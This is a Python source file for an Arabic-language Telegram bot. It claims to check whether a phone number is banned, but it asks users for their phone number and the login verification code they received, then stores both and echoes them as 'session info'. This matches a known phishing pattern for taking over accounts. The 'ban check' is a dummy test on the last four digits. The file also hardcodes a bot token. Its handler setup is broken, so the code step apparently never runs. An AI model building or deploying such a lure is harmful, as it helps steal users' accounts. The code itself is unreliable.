import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext, CallbackQueryHandler
import phonenumbers

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

TOKEN = "6529257547:AAG2MGxNXMLGxQtyUtA2zWEylP9QD5m-hGE"

users_data = {}

def start(update: Update, context: CallbackContext) -> None:
    keyboard = [
        [InlineKeyboardButton("إدخال رقم التليجرام", callback_data='enter_number')],
        [InlineKeyboardButton("مساعدة", callback_data='help')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    update.message.reply_text("👋 مرحباً! اختر خياراً:", reply_markup=reply_markup)

def button(update: Update, context: CallbackContext) -> None:
    query = update.callback_query
    query.answer()
    
    if query.data == 'enter_number':
        context.user_data['awaiting_number'] = True
        query.edit_message_text("👋 الرجاء إدخال رقم التليجرام الخاص بك مع رمز الدولة (مثال: +201234567890):")
    elif query.data == 'help':
        query.edit_message_text("ℹ️ هذا البوت يساعدك على التحقق من أرقام التليجرام. الرجاء إدخال رقم التليجرام الخاص بك مع رمز الدولة بعد اختيار 'إدخال رقم التليجرام'.")

def handle_number(update: Update, context: CallbackContext) -> None:
    user_id = update.message.from_user.id
    user_number = update.message.text

    if context.user_data.get('awaiting_number'):
        try:
            phone_number = phonenumbers.parse(user_number)
            if phonenumbers.is_valid_number(phone_number):
                users_data[user_id] = {'phone_number': user_number}
                context.user_data['awaiting_number'] = False
                context.user_data['awaiting_code'] = True
                update.message.reply_text("✅ تم استقبال الرقم. الرجاء إدخال رمز التحقق الذي تلقيته:")
            else:
                update.message.reply_text("❌ الرقم غير صحيح. الرجاء إدخال رقم صحيح:")
        except phonenumbers.phonenumberutil.NumberParseException:
            update.message.reply_text("❌ الرقم غير صحيح. الرجاء إدخال رقم صحيح:")

def handle_code(update: Update, context: CallbackContext) -> None:
    user_id = update.message.from_user.id
    user_code = update.message.text

    if context.user_data.get('awaiting_code'):
        users_data[user_id]['verification_code'] = user_code
        context.user_data['awaiting_code'] = False

        # فحص الرقم هنا (مثال بسيط للتحقق إذا كان الرقم محظورًا)
        if users_data[user_id]['phone_number'].endswith("1234"):
            update.message.reply_text("🚫 الرقم محظور.")
        else:
            update.message.reply_text("✅ الرقم صالح وغير محظور.")
            
        # إرسال الجلسة للمستخدم (كمثال)
        session_info = f"رقم الهاتف: {users_data[user_id]['phone_number']}\nرمز التحقق: {users_data[user_id]['verification_code']}"
        update.message.reply_text(f"🔐 معلومات الجلسة:\n{session_info}")
    else:
        update.message.reply_text("❌ لم يتم استقبال رقم الهاتف. الرجاء إرسال رقم الهاتف أولاً.")

def main() -> None:
    updater = Updater(TOKEN)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CallbackQueryHandler(button))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_number))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_code))

    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
